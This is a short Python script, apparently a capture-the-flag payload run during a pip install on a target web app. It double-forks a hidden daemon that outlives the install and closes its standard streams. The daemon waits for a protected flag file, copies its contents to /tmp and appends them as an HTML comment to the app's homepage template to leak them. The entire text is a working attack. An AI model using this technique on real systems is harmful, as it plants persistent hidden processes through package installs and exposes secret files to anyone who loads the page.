import os, time

# Double-fork a daemon that outlives this pip run, waits for the /admin/update
# handler to rewrite /.txt.galf (it unlinks it before pip, rewrites it after),
# then leaks the flag by appending it to the homepage template (we are root).
if os.fork() == 0:
    os.setsid()
    if os.fork() == 0:
        try:
            os.close(0); os.close(1); os.close(2)
        except Exception:
            pass
        tmpl = "/app/src/phonenumber/templates/index.html"
        deadline = time.time() + 90
        while time.time() < deadline:
            try:
                if os.path.exists("/.txt.galf"):
                    flag = open("/.txt.galf").read().strip()
                    try:
                        open("/tmp/.flagout", "w").write(flag)
                    except Exception:
                        pass
                    try:
                        with open(tmpl, "a") as f:
                            f.write("\n<!--PWNFLAG:" + flag + ":PWNFLAG-->\n")
                    except Exception:
                        pass
                    break
            except Exception:
                pass
            time.sleep(0.3)
        os._exit(0)
    os._exit(0)

raise SystemExit("daemon-armed")
